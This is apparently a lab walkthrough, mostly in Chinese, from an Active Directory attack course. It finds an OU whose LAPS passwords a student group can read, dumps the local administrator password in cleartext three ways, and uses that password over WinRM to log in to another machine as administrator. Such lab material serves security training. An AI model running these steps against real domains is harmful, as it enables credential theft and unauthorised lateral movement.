Task
•  Identify OUs where LAPS is in use and user(s) who have permission to read passwords.
•  Abuse the permissions to get the clear text password(s).


# Identify OUs where LAPS is in use and user(s) who have permission to read passwords.

引入 ActiveDirectory module
```
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

引入AdmPwd
```
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
```


查看对哪台机器有LAPS
```
PS C:\ad\Tools>  C:\AD\Tools\Get-LapsPermissions.ps1

Read Rights

organizationalUnit                     IdentityReference
------------------                     -----------------
OU=MailMgmt,DC=us,DC=techcorp,DC=local US\studentusers

Write Rights

OU=MailMgmt,DC=us,DC=techcorp,DC=local NT AUTHORITY\SELF
```

也可以使用powerview
```
PS C:\ad\Tools> Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}


AceQualifier           : AccessAllowed
ObjectDN               : OU=MailMgmt,DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ReadProperty, ExtendedRight
ObjectAceType          : ms-Mcs-AdmPwd
ObjectSID              :
InheritanceFlags       : ContainerInherit
BinaryLength           : 72
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-1116
AccessMask             : 272
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit, InheritOnly
InheritedObjectAceType : Computer
OpaqueLength           : 0
IdentityName           : US\studentusers
```


枚举结果表明 studentusers这个组可以对 us-MailMgmt有LAPS权限，可以读取这台机器的密码



# Abuse the permissions to get the clear text password(s).


1. 使用ActiveDirectory module读取密码
```
PS C:\ad\Tools> Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
/c}Jgsb!4t33.2
```

2. 使用LAPS module
```
PS C:\ad\Tools> Get-AdmPwdPassword -ComputerName us-mailmgmt

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
US-MAILMGMT          CN=US-MAILMGMT,OU=MailMgmt,DC=us,DC=techco... /c}Jgsb!4t33.2     11/30/2022 1:08:5...
```

3. 使用pv
```
PS C:\ad\Tools> Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
/c}Jgsb!4t33.2
```

密码是：```/c}Jgsb!4t33.2```



## 利用密码横向到us-mailmgmt

1. winrs

cmd下
```
C:\Users\studentuser138>winrs -r:us-mailmgmt -u:.\administrator -p:/c}Jgsb!4t33.2 cmd
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>whoami
whoami
us-mailmgmt\administrator

C:\Users\Administrator>hostname
hostname
US-MailMgmt
```

2. powershell

使用明文密码建一个session
```
PS C:\ad\Tools> $passwd = ConvertTo-SecureString '/c}Jgsb!4t33.2' -AsPlainText -Force
PS C:\ad\Tools> $creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\administrator", $passwd)
PS C:\ad\Tools> $mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
PS C:\ad\Tools> $mailmgmt

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          us-mailmgmt     RemoteMachine   Opened        Microsoft.PowerShell     Available
```

横向到us-mailmgmt
```
PS C:\ad\Tools> Enter-PSSession $mailmgmt
[us-mailmgmt]: PS C:\Users\Administrator\Documents> whoami
us-mailmgmt\administrator
[us-mailmgmt]: PS C:\Users\Administrator\Documents> hostname
US-MailMgmt
```